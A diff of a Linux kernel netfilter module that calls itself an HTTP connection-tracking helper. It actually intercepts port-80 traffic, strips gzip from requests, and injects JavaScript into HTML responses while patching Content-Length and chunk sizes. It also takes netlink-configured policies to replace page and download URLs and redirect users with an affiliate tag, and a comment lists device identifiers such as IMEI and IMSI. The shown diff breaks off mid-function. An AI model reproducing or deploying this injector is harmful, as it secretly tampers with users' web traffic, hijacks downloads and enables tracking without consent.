@@ -10,21 +10,17 @@
 #include <linux/version.h>
 #include <linux/sched.h>
 #include <linux/netlink.h>
-#include <net/sock.h>
+#include <linux/list.h>
+#include <linux/spinlock.h>
+#include <linux/string.h>
 
+#include <net/sock.h>
 #include <net/netfilter/nf_conntrack.h>
 #include <net/netfilter/nf_conntrack_expect.h>
 #include <net/netfilter/nf_conntrack_ecache.h>
 #include <net/netfilter/nf_conntrack_helper.h>
 #include <net/netfilter/nf_nat_helper.h>
 
-//////////////////////////////////BASE/////////////////////////
-static void change_package(struct sk_buff *skb,
-		       unsigned int protoff,
-		       struct nf_conn *ct,
-		       enum ip_conntrack_info ctinfo);
-
-static char *ts_algo = "kmp";
 
 MODULE_AUTHOR("yjj");
 MODULE_DESCRIPTION("http connection tracking module");
@@ -32,232 +28,67 @@ MODULE_LICENSE("GPL");
 MODULE_ALIAS("ip_conntrack_http");
 MODULE_ALIAS_NFCT_HELPER("http");
 
-enum http_strings {
-	SEARCH_GET,
-	SEARCH_RESPONSE,
-	SEARCH_ACCEPT_ENCODING,
-	SEARCH_REQUEST_FILTER,
-	SEARCH_RESPONSE_FILTER1,
-	SEARCH_RESPONSE_FILTER2,
-	SEARCH_INSERT_JS1,
-	SEARCH_INSERT_JS2,
-	SEARCH_INSERT_JS3,
-	SEARCH_IS_CHUNKED,
-	SEARCH_CHUNKED_VALUE_START,
-	SEARCH_CHUNKED_VALUE_STOP,
-	SEARCH_CONTENT_LEN_VALUE_START,
-	SEARCH_CONTENT_LEN_VALUE_STOP,
-};
-
-static struct {
-	const char		*string;
-	size_t			len;
-	struct ts_config	*ts;
-} search[] __read_mostly = {
-	[SEARCH_GET] = {
-		.string	= "GET ",
-		.len	= 4 ,
-	},
-	[SEARCH_RESPONSE] = {
-		.string	= "HTTP/1.1 200 OK",
-		.len	= 15,
-	},
-	[SEARCH_ACCEPT_ENCODING] = {
-		.string	= "Accept-Encoding: gzip ",
-		.len	= 21,
-	},
-	[SEARCH_REQUEST_FILTER] = {
-		.string	= "Accept: text/html",
-		.len	= 17,
-	},
-	[SEARCH_RESPONSE_FILTER1] = {
-		.string	= "Content-Type: text/html",
-		.len	= 23,
-	},
-	[SEARCH_RESPONSE_FILTER2] = {
-		.string	= "Content-Encoding: gzip",
-		.len	= 22,
-	},
-	[SEARCH_INSERT_JS1] = {
-		.string	= "<!DOCTYPE",
-		.len	= 9,
-	},
-	[SEARCH_INSERT_JS2] = {
-		.string	= "<!doctype",
-		.len	= 9,
-	},
-	[SEARCH_INSERT_JS3] = {
-		.string	= "<html",
-		.len	= 5,
-	},
-	[SEARCH_IS_CHUNKED] = {
-		.string	= "Transfer-Encoding: chunked",
-		.len	= 26,
-	},
-	[SEARCH_CHUNKED_VALUE_START] = {
-		.string	= "\r\n\r\n",
-		.len	= 4,
-	},
-	[SEARCH_CHUNKED_VALUE_STOP] = {
-		.string	= "\r\n",
-		.len	= 2,
-	},
-	[SEARCH_CONTENT_LEN_VALUE_START] = {
-		.string	= "Content-Length: ",
-		.len	= 16,
-	},
-	[SEARCH_CONTENT_LEN_VALUE_STOP] = {
-		.string	= "\r\n",
-		.len	= 2,
-	},
-};
-
-
-static inline int http_merge_packet(struct sk_buff *skb,
-					struct nf_conn *ct,
-					enum ip_conntrack_info ctinfo,
-					unsigned int protoff,
-					unsigned int match_offset,
-					unsigned int match_len,
-					const char *rep_buffer,
-					unsigned int rep_len)
-{
-
-	//printk("!! match_offset=%d,match_len=%d,rep_buffer=%s,rep_len=%d\n",match_offset,match_len,rep_buffer,rep_len);      	
-	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,14)
-		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,protoff,	
-										match_offset ,match_len,		
-										rep_buffer, rep_len); 
-	#else
-		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,	
-										match_offset ,match_len,		
-										rep_buffer, rep_len);
-	#endif
-
-	
-}
-
-static inline int http_repair_packet(struct sk_buff *skb,
-					struct nf_conn *ct,
-					enum ip_conntrack_info ctinfo,
-					unsigned int protoff)
-{
-	if (!ct||
-		!test_bit(IPS_SEQ_ADJUST_BIT, &ct->status)||
-		(ctinfo == IP_CT_RELATED + IP_CT_IS_REPLY)) 
-	{
-		return 0;   
-	}
-	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,14)
-		return nf_nat_seq_adjust_hook(skb, ct, ctinfo,protoff);
-	#else
-		return nf_nat_seq_adjust_hook(skb, ct, ctinfo);
-	#endif
-	
-}
-
-static int http_help(struct sk_buff *skb,
-		       unsigned int protoff,
-		       struct nf_conn *ct,
-		       enum ip_conntrack_info ctinfo)
-{
-    
-    struct tcphdr* tcph;
-	struct ts_state ts;
-	unsigned int dataoff, matchoff;
-
-    if (0 != skb_linearize(skb))
-	{
-		printk(" !!! skb_linearize error\n");
-		return NF_ACCEPT;
-	}
-	//no need , kernel repair auto
-	//http_repair_packet(skb, ct, ctinfo,protoff);
-	
-	/* No data? */
-	tcph = (struct tcphdr *)((char*)ip_hdr(skb)+protoff);
-	dataoff = protoff + (tcph->doff<<2);
-	if (dataoff >= skb->len) {
-		//if (net_ratelimit())
-		//	printk("http_help: skblen = %u\n", skb->len);
-		return NF_ACCEPT;
-	}
-	
-	/* from client */
-	if (CTINFO2DIR(ctinfo) == IP_CT_DIR_ORIGINAL)
-	{
-		memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_GET].ts, &ts);
-		if (matchoff == UINT_MAX)
-			return NF_ACCEPT;
-
-		memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_REQUEST_FILTER].ts, &ts);
-		if (matchoff == UINT_MAX)
-			return NF_ACCEPT;
-		
-		memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_ACCEPT_ENCODING].ts, &ts);
-		if (matchoff == UINT_MAX)
-			return NF_ACCEPT;
-
-		http_merge_packet(skb, ct, ctinfo,protoff,
-				       matchoff, 1,
-				       "B", 1);
-	}
-	/* from server IP_CT_DIR_REPLY*/
-	else
-	{
-		
-		memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_RESPONSE].ts, &ts);
-		if (matchoff == UINT_MAX)
-			return NF_ACCEPT;
-
-		memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_RESPONSE_FILTER1].ts, &ts);
-		if (matchoff == UINT_MAX)
-			return NF_ACCEPT;
-
-        memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-			      search[SEARCH_RESPONSE_FILTER2].ts, &ts);
-		if (matchoff != UINT_MAX)
-			return NF_ACCEPT;
-		
-		change_package(skb,protoff,ct,ctinfo);
-		
-		//printk("%s\n" , (char*)ip_hdr(skb)+dataoff);
-	}
-
-	return NF_ACCEPT;
-}
-
-static const struct nf_conntrack_expect_policy http_exp_policy = {
-	.max_expected		= 3,
-	.timeout		= 180,
-};
-
-static struct nf_conntrack_helper http_helper __read_mostly = {
-	.name			= "http",
-	.me			= THIS_MODULE,
-	.help			= http_help,
-	.tuple.src.l3num	= AF_INET,
-	.tuple.src.u.tcp.port	= cpu_to_be16(80),
-	.tuple.dst.protonum	= IPPROTO_TCP,
-	.expect_policy		= &http_exp_policy,
-};
+//////////////////////////////////netlink///////////////////////
 
 #define	MNETLINK_PROTO		31
 static struct sock *nl_sk = NULL;
 static int nl_pid=0;
+static DEFINE_SPINLOCK(http_netlink_lock);
 
-int mnlk_send(char* info)
+enum 
+{
+    CMD_JS=0x01,
+    CMD_CPC=0x02,
+    CMD_PAGE_URL_REPLACE=0x04,
+    CMD_DOWNLOAD_URL_REPLACE=0x08,
+    CMD_MAX
+};
+
+#define MAX_POLICY_NUM 3
+#define MAX_POLICY_SIZE 16
+#define MAX_JS_SIZE 512
+
+#pragma pack (push)
+#pragma pack(1)
+
+struct policy_replace
+{
+    char src_num;
+    char src[MAX_POLICY_NUM][MAX_POLICY_SIZE];
+    char filter_num;
+    char filter[MAX_POLICY_NUM][MAX_POLICY_SIZE];
+    char dst[MAX_POLICY_SIZE];
+};
+
+struct policy_cpc
+{
+    char src_num;
+    char src[MAX_POLICY_NUM][MAX_POLICY_SIZE];
+    char dst_num;
+    char dst[MAX_POLICY_NUM][MAX_POLICY_SIZE];
+    char is_add;
+};
+
+struct policy_buf
+{
+    char cmd;
+    unsigned long reissue_time;//sec
+    char js_rate;
+    char js[MAX_JS_SIZE];//include<< web_polling_rule,web_polling_num,pub_key,media_type,phone_model,imei,imsi,network,version_name,version_code,os,os_type,android_version,android_id,vendor,serial,resolution
+    char cpc_rate;
+    char cpc_num;
+    struct policy_cpc cpc[MAX_POLICY_NUM];
+    char page_url_num;
+    struct policy_replace page_url[MAX_POLICY_NUM];
+    char download_url_num;
+    struct policy_replace download_url[MAX_POLICY_NUM];
+};
+
+#pragma pack(pop)
+
+static struct policy_buf gpy;
+
+static int mnlk_send(char* info)
 {
 	int size;
     struct sk_buff *skb;
@@ -274,34 +105,41 @@ int mnlk_send(char* info)
     nlh->nlmsg_len = skb->tail - old_tail; 
 
     NETLINK_CB(skb).dst_group = 0;
+    spin_lock_bh(&http_netlink_lock);
     retval = netlink_unicast(nl_sk, skb, nl_pid, MSG_DONTWAIT);
+    spin_unlock_bh(&http_netlink_lock);
     return 0;
 }
 
 static void mnlk_rcv(struct sk_buff *skb)
 {
 	struct nlmsghdr *nlh;
-	
 	nlh = nlmsg_hdr(skb);
 
+    //printk("%d---%d---%d" , nlh->nlmsg_len , sizeof(struct policy_buf) , NLMSG_HDRLEN);
+    
 	/* Bad header */
-	if (nlh->nlmsg_len < NLMSG_HDRLEN)
+	if (nlh->nlmsg_len < NLMSG_HDRLEN || nlh->nlmsg_len!= NLMSG_SPACE(sizeof(struct policy_buf)))
 	{
-		printk("netlink bad header\n");
+		printk("webad:netlink bad header\n");     
 		return ;
 	}
-
+   
+    spin_lock_bh(&http_netlink_lock);  
 	nl_pid = nlh->nlmsg_pid;
-
-    printk("data rcv from user are:%s\n", (char *)NLMSG_DATA(nlh));
-	printk("netlink rcv userpid:%d\n",nl_pid );
+    memset(&gpy , '\0' , sizeof(struct policy_buf));
+    memcpy(&gpy , (char *)NLMSG_DATA(nlh) , sizeof(struct policy_buf));
+	printk("webad:netlink rcv userpid:%d len :%d ,js : %s\n",nl_pid ,nlh->nlmsg_len , gpy.js);
+    spin_unlock_bh(&http_netlink_lock); 
     mnlk_send("kernel rcv ok");
 }
 
-int mnlk_init(void)
+static int mnlk_init(void)
 {
-
-	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,14)
+    
+    memset(&gpy , '\0' , sizeof(struct policy_buf));
+    
+	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
 	  	struct netlink_kernel_cfg cfg = {  
 	        .input = mnlk_rcv,  
 	    };
@@ -313,43 +151,424 @@ int mnlk_init(void)
 	
 	if (NULL == nl_sk) 
 	{
-		printk("netlink_kernel_create error\n");
+		printk("webad:netlink_kernel_create error\n");
 		return - 1;
 	}
+    
 	return 0;
 }
 
-void mnlk_fini(void)
+static void mnlk_fini(void)
 {
 	if(nl_sk) 
 	{
-	    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,14)
+	    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
 	    	netlink_kernel_release(nl_sk);  
     	#else
     	   	sock_release(nl_sk->sk_socket);
     	#endif
-	}
+	}        
 }
+
+////////////////////////////////BASE////////////////////////////
+#define MAX_HTTP_HEAD_LEN 256
+
+#pragma pack (push)
+#pragma pack(1)
+
+struct http_skb
+{
+    struct nf_conn *ct;
+	enum ip_conntrack_info ctinfo;
+    struct sk_buff *skb;
+    struct iphdr* iph;
+    struct tcphdr* tcph;
+    unsigned int protoff;
+    unsigned int dataoff;
+    char* data;
+    unsigned int data_len;
+    unsigned int http_head_len;
+};
+#pragma pack(pop)
+
+static char *ts_algo = "kmp";
+
+enum http_strings {
+	SEARCH_ACCEPT_ENCODING,
+	SEARCH_REQUEST_FILTER,
+    SEARCH_REQUEST_HOST_START,
+	SEARCH_RESPONSE_FILTER1,
+	SEARCH_RESPONSE_FILTER2,
+	SEARCH_HTTP_DATA_START,
+	SEARCH_CONTENT_LEN_VALUE_START,
+	SEARCH_COMMON_VALUE_STOP,
+};
+
+static struct {
+	const char		*string;
+	size_t			len;
+	struct ts_config	*ts;
+} search[] __read_mostly = {
+	[SEARCH_ACCEPT_ENCODING] = {
+		.string	= "Accept-Encoding: gzip",
+		.len	= 21,
+	},
+	[SEARCH_REQUEST_FILTER] = {
+		.string	= "Accept: text/html",
+		.len	= 17,
+	},	
+    [SEARCH_REQUEST_HOST_START] = {
+        .string = "Host: ",
+        .len    = 6,
+    },
+	[SEARCH_RESPONSE_FILTER1] = {
+		.string	= "Content-Type: text/html",
+		.len	= 23,
+	},
+	[SEARCH_RESPONSE_FILTER2] = {
+		.string	= "Content-Encoding: gzip",
+		.len	= 22,
+	},
+	[SEARCH_HTTP_DATA_START] = {
+		.string	= "\r\n\r\n",
+		.len	= 4,
+	},
+	[SEARCH_CONTENT_LEN_VALUE_START] = {
+		.string	= "Content-Length: ",
+		.len	= 16,
+	},
+	[SEARCH_COMMON_VALUE_STOP] = {
+		.string	= "\r\n",
+		.len	= 2,
+	},
+};
+
+#pragma pack (push)
+#pragma pack(1)
+
+struct http_session
+{
+    long last_time;
+    char host[32];
+    unsigned long sip,dip;
+    unsigned short sp,dp;
+    unsigned int response_num;
+};
+
+#pragma pack(pop)
+
+#define MAX_HTTP_SESSION_TIMEOUT_SEC 3
+struct http_session ghttps;
+static DEFINE_SPINLOCK(http_session_lock);
+
+static void init_http_session(void)
+{
+    memset(&ghttps , '\0' , sizeof(struct http_session));
+}
+
+static void set_http_session(struct http_skb *hskb)
+{
+    
+    struct ts_state ts;
+    unsigned int matchoff_start,matchoff_stop;
+
+    memset(&ts, 0, sizeof(ts));
+    matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
+             search[SEARCH_REQUEST_HOST_START].ts, &ts);
+    if (matchoff_start == UINT_MAX)
+       return;
+
+    matchoff_start += search[SEARCH_REQUEST_HOST_START].len;
+    if(unlikely(matchoff_start >= hskb->data_len))
+        return;
+    
+    memset(&ts, 0, sizeof(ts));
+    matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff+matchoff_start, hskb->data_len-matchoff_start,
+             search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
+    if (matchoff_stop == UINT_MAX)
+       return;
+
+    if(unlikely(matchoff_stop > 32))
+       return;
+    
+    spin_lock_bh(&http_session_lock);  
+    memset(ghttps.host , '\0' , 32);
+    memcpy(ghttps.host , hskb->data+matchoff_start , matchoff_stop);
+    ghttps.sip = hskb->iph->saddr;
+    ghttps.dip = hskb->iph->daddr;
+    ghttps.sp = hskb->tcph->source;
+    ghttps.dp = hskb->tcph->dest;
+    ghttps.last_time = get_seconds();
+    ghttps.response_num = 0;
+    spin_unlock_bh(&http_session_lock);  
+    return;
+    
+}
+
+static int  is_http_session_timeout(void)
+{
+    long last_time = get_seconds();
+    spin_lock_bh(&http_session_lock);
+    if(last_time - ghttps.last_time > MAX_HTTP_SESSION_TIMEOUT_SEC)
+    {
+        spin_unlock_bh(&http_session_lock);
+        return 1;
+    }
+    spin_unlock_bh(&http_session_lock);
+    return 0;
+}
+
+static int is_http_session_request(struct http_skb* https)
+{
+    spin_lock_bh(&http_session_lock);
+    if(https->iph->saddr == ghttps.dip &&
+                https->iph->daddr == ghttps.sip &&
+                https->tcph->source == ghttps.dp &&
+                https->tcph->dest == ghttps.sp &&
+                ghttps.response_num == 0)
+    {
+        spin_unlock_bh(&http_session_lock);
+        return 1;
+    }
+    spin_unlock_bh(&http_session_lock);
+    return 0;
+}
+
+static void update_http_session(void)
+{
+    spin_lock_bh(&http_session_lock);  
+    ghttps.response_num = 1;
+    spin_unlock_bh(&http_session_lock);  
+}
+
+static void change_package(struct http_skb *hskb);
+
+static int (*http_merge_packet_hook)(struct sk_buff *skb,
+					struct nf_conn *ct,
+					enum ip_conntrack_info ctinfo,
+					unsigned int protoff,
+					unsigned int match_offset,
+					unsigned int match_len,
+					const char *rep_buffer,
+					unsigned int rep_len)__read_mostly;
+
+static int http_merge_packet(struct sk_buff *skb,
+					struct nf_conn *ct,
+					enum ip_conntrack_info ctinfo,
+					unsigned int protoff,
+					unsigned int match_offset,
+					unsigned int match_len,
+					const char *rep_buffer,
+					unsigned int rep_len)
+{
+
+	//printk("webad:!! match_offset=%d,match_len=%d,rep_buffer=%s,rep_len=%d\n",match_offset,match_len,rep_buffer,rep_len);      	
+	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
+		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,protoff,	
+										match_offset ,match_len,		
+										rep_buffer, rep_len); 
+	#else
+		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,	
+										match_offset ,match_len,		
+										rep_buffer, rep_len);
+	#endif
+
+	
+}
+
+static void (*http_from_client_hook)(struct http_skb *hskb)__read_mostly;
+
+static void (*http_from_server_hook)(struct http_skb *hskb)__read_mostly;
+
+static void http_from_client(struct http_skb *hskb)
+{
+    struct ts_state ts;
+    unsigned int matchoff;  
+    struct http_skb* tmp_hskb;
+    
+    typeof(http_merge_packet_hook) http_merge_packet_tmp;
+
+    tmp_hskb = rcu_dereference(hskb);
+
+    if(!is_http_session_timeout())
+    {
+        return;
+    }
+    if(0!=memcmp(tmp_hskb->data , "GET " , 4))
+    {
+        return;
+    }
+    memset(&ts, 0, sizeof(ts));
+    matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
+    	      search[SEARCH_REQUEST_FILTER].ts, &ts);
+    if (matchoff == UINT_MAX)
+    	return;
+    memset(&ts, 0, sizeof(ts));
+	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
+		      search[SEARCH_ACCEPT_ENCODING].ts, &ts);
+	if (matchoff == UINT_MAX)
+		return;
+    http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
+	http_merge_packet_tmp(tmp_hskb->skb, tmp_hskb->ct, tmp_hskb->ctinfo,tmp_hskb->protoff,
+			       matchoff, 1,
+			       "B", 1);
+    set_http_session(hskb);
+    return;
+}
+
+static void http_from_server(struct http_skb *hskb)
+{
+    struct ts_state ts;
+    unsigned int matchoff;
+    struct http_skb* tmp_hskb;
+
+    tmp_hskb = rcu_dereference(hskb);
+    if(!is_http_session_request(tmp_hskb))
+    {
+        return;
+    }
+    if(0!=memcmp(tmp_hskb->data , "HTTP/1.1 200 OK" , 15))
+    {
+        return;
+    }
+    memset(&ts, 0, sizeof(ts));
+	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
+		      search[SEARCH_HTTP_DATA_START].ts, &ts);
+	if (matchoff == UINT_MAX)
+	    return;
+	    
+    tmp_hskb->http_head_len= matchoff + search[SEARCH_HTTP_DATA_START].len;//include /r/n/r/n
+    if(unlikely(tmp_hskb->http_head_len >= tmp_hskb->data_len))
+        return;
+    
+	memset(&ts, 0, sizeof(ts));
+	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
+		      search[SEARCH_RESPONSE_FILTER1].ts, &ts);
+	if (matchoff == UINT_MAX)
+	    return;
+
+    memset(&ts, 0, sizeof(ts));
+	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
+		      search[SEARCH_RESPONSE_FILTER2].ts, &ts);
+	if (matchoff != UINT_MAX)
+	    return;
+
+    change_package(tmp_hskb);
+    
+    update_http_session();
+}
+
+static int  http_help(struct sk_buff *skb,
+		       unsigned int protoff,
+		       struct nf_conn *ct,
+		       enum ip_conntrack_info ctinfo)
+{
+    struct http_skb hskb;
+    struct http_skb* tmp_hskb;
+    
+	typeof(http_from_client_hook) http_from_client_tmp;
+    typeof(http_from_server_hook) http_from_server_tmp;
+
+    if (0 != skb_linearize(skb))
+	{
+		printk("webad: !!! skb_linearize error\n");
+		return NF_ACCEPT;
+	}
+    hskb.ct = ct;
+    hskb.ctinfo = ctinfo;
+    hskb.skb = skb;
+	/* No data? */
+    hskb.iph = ip_hdr(hskb.skb);
+    if(!hskb.iph)
+    {
+		printk("webad: !!! ip error\n");
+		return NF_ACCEPT;
+	}
+    
+    if(protoff != hskb.iph->ihl <<2)
+    {
+        printk("webad: !!! iph->ihl error\n");
+        return NF_ACCEPT;
+    }
+	if (skb->len != ntohs(hskb.iph->tot_len))
+	{
+	    printk("webad: !!! iph->tot_len error\n");
+        return NF_ACCEPT;
+    }
+    
+    hskb.protoff = protoff;
+    hskb.tcph = (struct tcphdr *)((char*)hskb.iph+hskb.protoff);
+    if(!hskb.tcph)
+    {
+		printk("webad: !!! tcp error\n");
+		return NF_ACCEPT;
+	}
+	hskb.dataoff = hskb.protoff + (hskb.tcph->doff<<2);
+    hskb.data_len = hskb.skb->len - hskb.dataoff;
+	if (hskb.data_len <= MAX_HTTP_HEAD_LEN) 
+    {
+		//if (net_ratelimit())
+		//	printk("webad: skblen = %u\n", skb->len);
+		return NF_ACCEPT;
+	}
+     
+    //printk("webad ~~~~~~%d\n" , hskb.data_len);
+    hskb.data = (char*)hskb.iph + hskb.dataoff;
+    rcu_assign_pointer(tmp_hskb , &hskb);
+    
+	/* from client */
+	if (CTINFO2DIR(ctinfo) == IP_CT_DIR_ORIGINAL)
+	{
+	    http_from_client_tmp = rcu_dereference(http_from_client_hook); 
+        http_from_client_tmp(tmp_hskb);
+	}
+	/* from server IP_CT_DIR_REPLY*/
+	else
+	{
+	    http_from_server_tmp = rcu_dereference(http_from_server_hook); 
+        http_from_server_tmp(tmp_hskb);
+	}
+	return NF_ACCEPT;
+}
+
+static const struct nf_conntrack_expect_policy http_exp_policy = {
+	.max_expected		= 256,
+	.timeout		= 180,
+};
+
+static struct nf_conntrack_helper http_helper __read_mostly = {
+	.name			= "http",
+	.me			= THIS_MODULE,
+	.help			= http_help,
+	.tuple.src.l3num	= NFPROTO_IPV4,
+	.tuple.src.u.tcp.port	= cpu_to_be16(80),
+	.tuple.dst.protonum	= IPPROTO_TCP,
+	.expect_policy		= &http_exp_policy,
+};
 
 static void __exit nf_conntrack_http_fini(void)
 {
 	int i;
 
-    mnlk_fini();
-    
+    rcu_assign_pointer(http_from_client_hook, NULL);
+    rcu_assign_pointer(http_from_server_hook, NULL);
+    rcu_assign_pointer(http_merge_packet_hook, NULL);
 	nf_conntrack_helper_unregister(&http_helper);
 	for (i = 0; i < ARRAY_SIZE(search); i++)
 		textsearch_destroy(search[i].ts);
+
+    mnlk_fini();
 }
 
 static int __init nf_conntrack_http_init(void)
 {
 	int ret, i;
-
+    
     if(-1==mnlk_init())
-    {
         return -1;
-    }
+
+    init_http_session();
+    
 	for (i = 0; i < ARRAY_SIZE(search); i++) {
 		search[i].ts = textsearch_prepare(ts_algo, search[i].string,
 						  search[i].len,
@@ -359,6 +578,13 @@ static int __init nf_conntrack_http_init(void)
 			goto err1;
 		}
 	}
+    BUG_ON(http_from_client_hook != NULL);
+    rcu_assign_pointer(http_from_client_hook, http_from_client);
+    BUG_ON(http_from_server_hook != NULL);
+    rcu_assign_pointer(http_from_server_hook, http_from_server);
+    BUG_ON(http_merge_packet_hook != NULL);
+    rcu_assign_pointer(http_merge_packet_hook, http_merge_packet);
+    
 	ret = nf_conntrack_helper_register(&http_helper);
 	if (ret < 0)
 		goto err1;
@@ -383,7 +609,7 @@ module_exit(nf_conntrack_http_fini);
 Content-Type: text/html\r\n\
 Content-Length: 55\r\n\
 Connection: Keep-Alive\r\n\
-Location: https://www.baidu.com\r\n \
+Location: https://m.baidu.com?from=1009647e\r\n \
 \r\n\r\n\
 <html>\
 <head><title>302 Found</title></head>\
@@ -392,140 +618,113 @@ test\
 
 #define REDIRECT_LEN strlen(REDIRECT)
 
-static void insert_js(struct sk_buff *skb,
-		       unsigned int protoff,
-		       struct nf_conn *ct,
-		       enum ip_conntrack_info ctinfo)
+static void insert_js(struct http_skb *hskb)
 {
 	struct ts_state ts;
-    struct tcphdr* tcph;
-	unsigned int dataoff, matchoff,matchoff_start,matchoff_stop;
+	unsigned int matchoff_start,matchoff_stop;
 	char src[32]={0},dst[32]={0};
 	unsigned int tmp;
-    //printk(KERN_INFO "yjjtest~~~~start\n");
-    tcph = (struct tcphdr *)((char*)ip_hdr(skb)+protoff);
-	dataoff = protoff + (tcph->doff<<2);
+    typeof(http_merge_packet_hook) http_merge_packet_tmp;
+    http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
+    
+    //printk("%d---%d---%d------%s----\n" , hskb->dataoff ,hskb->http_head_len, hskb->data_len ,hskb->data);
+
+    spin_lock_bh(&http_netlink_lock); 
+    printk(KERN_INFO "webad:~~~~start js :%s\n" , gpy.js);
+    spin_unlock_bh(&http_netlink_lock); 
+
+    spin_lock_bh(&http_session_lock); 
+    printk(KERN_INFO "webad:~~~~start host :%s\n" , ghttps.host);
+    spin_unlock_bh(&http_session_lock); 
     
 	memset(&ts, 0, sizeof(ts));
-	matchoff = skb_find_text(skb, dataoff, skb->len,
-			  search[SEARCH_INSERT_JS1].ts, &ts);
-	if (matchoff == UINT_MAX)
+	matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
+			  search[SEARCH_CONTENT_LEN_VALUE_START].ts, &ts);
+	if (matchoff_start == UINT_MAX)
 	{
-		memset(&ts, 0, sizeof(ts));
-		matchoff = skb_find_text(skb, dataoff, skb->len,
-				  search[SEARCH_INSERT_JS2].ts, &ts);
-		if (matchoff == UINT_MAX)
-		{
-			memset(&ts, 0, sizeof(ts));
-			matchoff = skb_find_text(skb, dataoff, skb->len,
-					  search[SEARCH_INSERT_JS3].ts, &ts);
-			if (matchoff == UINT_MAX)
-				return;
-		}
-	}
-    //printk(KERN_INFO "yjjtest~~~~start_insert:%s\n" , (char*)ip_hdr(skb)+dataoff);
-	if(!http_merge_packet(skb, ct, ctinfo,protoff,
-				   matchoff, 0,
-				   JS, JS_LEN))
-		return;
-    
-	memset(&ts, 0, sizeof(ts));
-	matchoff = skb_find_text(skb, dataoff, skb->len,
-			  search[SEARCH_IS_CHUNKED].ts, &ts);
-	if (matchoff == UINT_MAX)
-	{
+        //printk(KERN_INFO "webad:~~~~start change chunked\n");
+
+        matchoff_start = hskb->http_head_len;
         memset(&ts, 0, sizeof(ts));
-    	matchoff_start = skb_find_text(skb, dataoff, skb->len,
-    			  search[SEARCH_CONTENT_LEN_VALUE_START].ts, &ts);
-    	if (matchoff_start == UINT_MAX)
-    	{
-            return;
-        }
-        
-        //printk(KERN_INFO "yjjtest~~~~start change content len\n");
-        matchoff_start += search[SEARCH_CONTENT_LEN_VALUE_START].len;
-        memset(&ts, 0, sizeof(ts));
-    	matchoff_stop = skb_find_text(skb, dataoff+matchoff_start, skb->len,
-    			  search[SEARCH_CONTENT_LEN_VALUE_STOP].ts, &ts);
+    	matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff + matchoff_start, hskb->data_len - matchoff_start,
+    			  search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
     	if (matchoff_stop == UINT_MAX)
     		return;
 
-    	if(matchoff_stop > 8)
+    	if(unlikely(matchoff_stop > 8))
     	{
     		return;
     	}
-        memcpy(src , (char*)ip_hdr(skb)+dataoff+matchoff_start , matchoff_stop);
+    	memcpy(src , hskb->data + matchoff_start, matchoff_stop);
+    	sscanf(src, "%x", &tmp);
+    	tmp+=JS_LEN;
+    	sprintf(dst , "%x" , tmp);
+    	//printk(KERN_INFO "webad:~~~~~end change chunked:%s---%s\n" , src , dst);
+
+        if(!http_merge_packet_tmp(hskb->skb , hskb->ct , hskb->ctinfo , hskb->protoff,
+        	   hskb->http_head_len + matchoff_stop + search[SEARCH_COMMON_VALUE_STOP].len , 0,
+        	   JS, JS_LEN))
+            return;
+
+        if(!http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
+        		   hskb->http_head_len, matchoff_stop,
+        		   dst, strlen(dst)))
+        return;
+    }
+    else
+    {
+        //printk(KERN_INFO "webad:yjjtest~~~~start change content len\n");
+        matchoff_start += search[SEARCH_CONTENT_LEN_VALUE_START].len;
+        memset(&ts, 0, sizeof(ts));
+    	matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff + matchoff_start, hskb->data_len - matchoff_start,
+    			  search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
+    	if (matchoff_stop == UINT_MAX)
+    		return;
+
+    	if(unlikely(matchoff_stop > 8))
+    	{
+    		return;
+    	}
+        memcpy(src , hskb->data + matchoff_start , matchoff_stop);
     	sscanf(src, "%d", &tmp);
     	tmp +=JS_LEN;
     	sprintf(dst, "%d" , tmp);
-    	//printk(KERN_INFO "yjjtest~~~~~end change content len:%s---%s\n" , src , dst);
+    	//printk(KERN_INFO "webad:~~~~~end change content len:%s---%s\n" , src , dst);
 
-    	http_merge_packet(skb, ct, ctinfo,protoff,
+        if(!http_merge_packet_tmp(hskb->skb , hskb->ct , hskb->ctinfo , hskb->protoff,
+        	   hskb->http_head_len, 0,
+        	   JS, JS_LEN))
+            return;
+
+        if(!http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
     				   matchoff_start, matchoff_stop,
-    				   dst, strlen(dst));
